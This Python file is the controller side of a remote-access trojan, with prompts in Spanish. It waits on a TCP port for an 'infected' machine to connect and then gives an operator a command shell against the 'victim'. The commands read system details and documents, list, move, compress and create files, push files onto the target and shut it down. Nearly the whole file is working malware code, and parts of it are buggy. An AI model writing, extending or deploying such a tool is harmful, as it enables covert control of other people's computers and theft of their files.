import socket
from colorama import Fore, Back, Style
import colorama
import os
from time import sleep
import random

if os.name == "posix":
    os.system('printf "\033[8;10;42t"')
elif os.name == "ce" or os.name == "nt" or os.name == "dos":
    os.system('mode con: cols=124 lines=40')

def menuDeAyuda():
    borrarPantalla() 
    print(Fore.BLUE + "Esta es un lista de comandos disponibles") 
    print(Fore.BLUE + "---------------------------------------------------------------------------------------")
    print(Fore.WHITE + "Info - Muestra informacion del sistema infectado                                     " + Fore.BLUE + "|")
    print(Fore.BLUE + "---------------------------------------------------------------------------------------")
    print(Fore.WHITE + "Dir - Muestra los archivos en el directorio actual                                   " + Fore.BLUE + "|")
    print(Fore.BLUE + "---------------------------------------------------------------------------------------")
    print(Fore.WHITE + "Close - Cierra la conexion                                                           " + Fore.BLUE + "|")
    print(Fore.BLUE + "---------------------------------------------------------------------------------------")
    print(Fore.WHITE + "Cls - Limpia la consola                                                              " + Fore.BLUE + "|")
    print(Fore.BLUE + "---------------------------------------------------------------------------------------")
    print(Fore.WHITE + "Cd - Cambia el directorio actual                                                     " + Fore.BLUE + "|")
    print(Fore.BLUE + "---------------------------------------------------------------------------------------")
    print(Fore.WHITE + "Help - Muestra este menu de ayuda                                                    " + Fore.BLUE + "|")
    print(Fore.BLUE + "---------------------------------------------------------------------------------------")
    print(Fore.WHITE + "Pwd - Muestra el directorio actual                                                   " + Fore.BLUE + "|")
    print(Fore.BLUE + "---------------------------------------------------------------------------------------")
    print(Fore.WHITE + "Shutdown - Apaga la computadora (solo windows)                                       " + Fore.BLUE + "|")
    print(Fore.BLUE + "---------------------------------------------------------------------------------------")
    print(Fore.WHITE + "Download - Lleva archivos comprimidos al PC de la victima                            " + Fore.BLUE + "|")
    print(Fore.BLUE + "---------------------------------------------------------------------------------------")
    print(Fore.WHITE + "Col - Colapsa la ruta seleccionada con las carpetas indicadas                        " + Fore.BLUE + "|")
    print(Fore.BLUE + "---------------------------------------------------------------------------------------")
    print(Fore.WHITE + "Touch - Crea un archivo de texto en la ruta seleccionada                             " + Fore.BLUE + "|")
    print(Fore.BLUE + "---------------------------------------------------------------------------------------")
    print(Fore.WHITE + "Read - Sirve para leer documentos                                                    " + Fore.BLUE + "|")
    print(Fore.BLUE + "---------------------------------------------------------------------------------------")
    print(Fore.WHITE + "Compress - Comprime archivos en el ordenador de la victima                           " + Fore.BLUE + "|")
    print(Fore.BLUE + "---------------------------------------------------------------------------------------")
    print(Fore.WHITE + "Uncompress - Descomprime archivos en el ordenador de la victima                      " + Fore.BLUE + "|")
    print(Fore.BLUE + "---------------------------------------------------------------------------------------")
    print(Fore.WHITE + "Usr - Muestra el nombre de usuario de el ordenador infectado                         " + Fore.BLUE + "|")
    print(Fore.BLUE + "---------------------------------------------------------------------------------------")
    print(Fore.WHITE + "Mkdir - Crea una carpeta en la ruta espedificada                                     " + Fore.BLUE + "|")
    print(Fore.BLUE + "---------------------------------------------------------------------------------------")
    print(Fore.WHITE + "Move - Mueve archivos a la ruta seleccionada                                         " + Fore.BLUE + "|")
    print(Fore.BLUE + "---------------------------------------------------------------------------------------")

def borrarPantalla(): 
    if os.name == "posix": 
        os.system ("clear")
    elif os.name == "ce" or os.name == "nt" or os.name == "dos":
        os.system ("cls")

colorama.init()
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = '0.0.0.0'
port = 52324
s.bind((host, port))
s.listen(5

    )

borrarPantalla() 
print(Fore.YELLOW + f"[ServerInfo] Servidor abierto en: {host}, {port}")
print(Fore.BLUE + "[+] Esperando una conexion...")

guid = ""
cmdList = ["Help", "Close", "Cls", "Cd", "Info", "Dir", "Pwd", "Shutdown", "Download", "Banner", "Col", "Touch", "Read", "Uncompress", "Compress", "Usr", "Mkdir", "Move"]

clientsocket, address = s.accept()

marca = clientsocket.recv(1024)
marca.decode('utf-8')
print(Fore.BLUE + f"[+] Nueva conexion de {marca}/{address}")
def consola():
    while True:
     
        guid = input("Shell:")
     
        try:
            if(guid != ""):
                if(guid == "Banner"): 
                    defineBanner()
                if(guid == "Help"):
                    menuDeAyuda()
                    consola()
                if(guid == "Close"): 
                    clientsocket.send(bytes(guid, "utf-8"))
                    print(Fore.YELLOW + "[+] La conexion se ha roto" + Fore.RED)
                    sleep(1) #Espera un segundo
                    print("[+] Ya no podra ejecutar mas comandos en la victima" + Fore.BLUE)
                    os.system("pause")
                    break
                if(guid == "Cls"):
                    borrarPantalla()
                    consola()
                if(guid == "Cd"):
                    clientsocket.send(bytes(guid, "utf-8"))
                    direc = input("Input the directory:")
                    clientsocket.send(bytes(direc, "utf-8"))
                    print(f"Cambiando directorio a: {direc}")
                    consola()
                if(guid == "Info" or guid == "Dir" or guid == "Pwd" or guid == "Usr"):
                    clientsocket.send(bytes(guid, "utf-8"))
                    respuesta = clientsocket.recv(10024)
                    print(Fore.BLUE + "-------------------------------------------")
                    print(respuesta.decode("utf-8"))
                    print(Fore.BLUE + "-------------------------------------------")
                    consola()
                if(guid == "Shutdown"):
                    clientsocket.send(bytes(guid, "utf-8"))
                    print("[+] La conexion se perdera al apagar el ordenador (solo funciona en windows)")
                    break
                if(guid == "Download"):
                    clientsocket.send(bytes(guid, "utf-8")) 
                    fileName = input("Input the file path:")
                    clientsocket.send(bytes(fileName, "utf-8")) 
                    file = input("Output path:") 
                    f = open(file, 'rb') 
                    fileData = f.read(99999999)
                    clientsocket.send(fileData)
                    print("[+] Archivo enviado")
                    respuestaDeComprobacion = clientsocket.recv(1024)
                    print(respuestaDeComprobacion.decode("utf-8"))
                    consola()
                if(guid == "Col"):
                    clientsocket.send(bytes(guid, "utf-8"))
                    numC = int(input("Number of folders:"))
                    clientsocket.send(bytes(numC, "utf-8"))
                    colPath = input("Directory to collapse:")
                    clientsocket.send(bytes(numC, "utf-8"))
                    print(Fore.YELLOW + "[+] Collapsing directory" + Fore.BLUE)
                    print("[+] Esperando respuesta")
                    respuesta = clientsocket.recv(1024) 
                    print(respuesta.decode("utf-8")) 
                    consola()
                if(guid == "Touch"): 
                    clientsocket.send(bytes(guid, "utf-8"))
                    titulo = input("Document title: ") 
                    clientsocket.send(bytes(titulo, "utf-8")) 
                    filePath = input("Document directory: ")
                    clientsocket.send(bytes(filePath, "utf-8"))
                    content = input("Document content: ")
                    clientsocket.send(bytes(content, "utf-8"))
                    print("[+] Esperando respuesta")
                    respuestaDeConfrimacion = clientsocket.recv(1024)
                    print(respuestaDeConfirmacion.decode("utf-8")) 
                    consola()
                if(guid == "Read"): 
                    print(Fore.YELLOW + "NOTA: SOLO ARCHIVOS DE TEXTO PERMITIDOS")
                    clientsocket.send(bytes(guid, "utf-8")) 
                    fileRead = input("File directory: ") 
                    clientsocket.send(bytes(fileRead, "utf-8")) 
                    cont = clientsocket.recv(999999)
                    print("----------------------------------------------------")
                    print(cont.decode("utf-8")) 
                    print("----------------------------------------------------")
                    consola()
                if(guid == "Uncompress"): 
                    clientsocket.send(bytes(guid, "utf-8")) 
                    uncompressPath = input("File directory: ") 
                    clientsocket.send(bytes(uncompressPath, "utf-8")) 
                    finalPath = input("Output directory: ")
                    clientsocket.send(bytes(finalPath, "utf-8"))
                    print("[+] Esperando respuesta")
                    respuesta = clientsocket.recv(1024) 
                    print(respuesta.decode("utf-8")) 
                    consola()
                if(guid == "Compress"): 
                    clientsocket.send(bytes(guid, "utf-8")) 
                    nombreDelArchivo = input("File name: ") 
                    clientsocket.send(bytes(nombreDelArchivo, "utf-8")) 
                    rutaDelArchivo = input("File directory: ") 
                    clientsocket.send(bytes(rutaDelArchivo, "utf-8")) 
                    print("[+] Esperando respuesta")
                    respuesta = clientsocket.recv(1024) 
                    print(respuesta.decode("utf-8")) 
                    consola()
                if(guid == "Mkdir"): 
                    clientsocket.send(bytes(guid, "utf-8")) 
                    path = input("Input the directory: ") 
                    clientsocket.send(bytes(path, "utf-8")) 
                    print("[+] Esperando respuesta")
                    respuesta = clientsocket.recv(1024) 
                    print(respuesta.decode("utf-8")) 
                    consola()
                if(guid == "Move"): 
                    clientsocket.send(bytes(guid, "utf-8")) 
                    movePath = input("File directory: ")
                    clientsocket.send(bytes(movePath, "utf-8")) 
                    moveDestiny = input("Output directory: ") 
                    clientsocket.send(bytes(moveDestiny, "utf-8"))
                    print("[+] Esperando respuesta")
                    respuestaDeConfirmacion = clientsocket.recv(1024)
                    print(respuestaDeConfirmacion.decode("utf-8"))
                    consola()
                if(guid != cmdList[0] and guid != cmdList[1] and guid != cmdList[2] and guid != cmdList[3] and guid != cmdList[4] and guid != cmdList[5] and guid != cmdList[6] and guid != cmdList[7] and guid != cmdList[8] and guid != cmdList[9] and guid != cmdList[10] and guid != cmdList[11] and guid != cmdList[12] and guid != cmdList[13] and guid != cmdList[14] and guid != cmdList[15] and guid != cmdList[16] and guid != cmdList[17]):
                    print(Fore.RED + "[Error]: Usted debe introducir un comando valido" + Fore.BLUE)
                    consola()
     
     
        except:
            print(Fore.RED + "[Error]: Ha habido un problema" + Fore.BLUE)
            print("[+] Esperando respuesta")
            respuesta = clientsocket.recv(1024)
            print(respuesta.decode("utf-8")) 
            if(guid == "Move"): 
                clientsocket.send(bytes(guid, "utf-8"))
                movePath = input("File directory: ") 
                clientsocket.send(bytes(movePath, "utf-8"))
                moveDestiny = input("Output directory: ")
                clientsocket.send(bytes(moveDestiny, "utf-8"))
                print("[+] Esperando respuesta")
                respuestaDeConfirmacion = clientsocket.recv(1024)
                print(respuestaDeConfirmacion.decode("utf-8"))
            if(guid != cmdList[0] and guid != cmdList[1] and guid != cmdList[2] and guid != cmdList[3] and guid != cmdList[4] and guid != cmdList[5] and guid != cmdList[6] and guid != cmdList[7] and guid != cmdList[8] and guid != cmdList[9] and guid != cmdList[10] and guid != cmdList[11] and guid != cmdList[12] and guid != cmdList[13] and guid != cmdList[14] and guid != cmdList[15] and guid != cmdList[16] and guid != cmdList[17]):
                print(Fore.RED + "[Error]: Usted debe introducir un comando valido" + Fore.BLUE)
consola()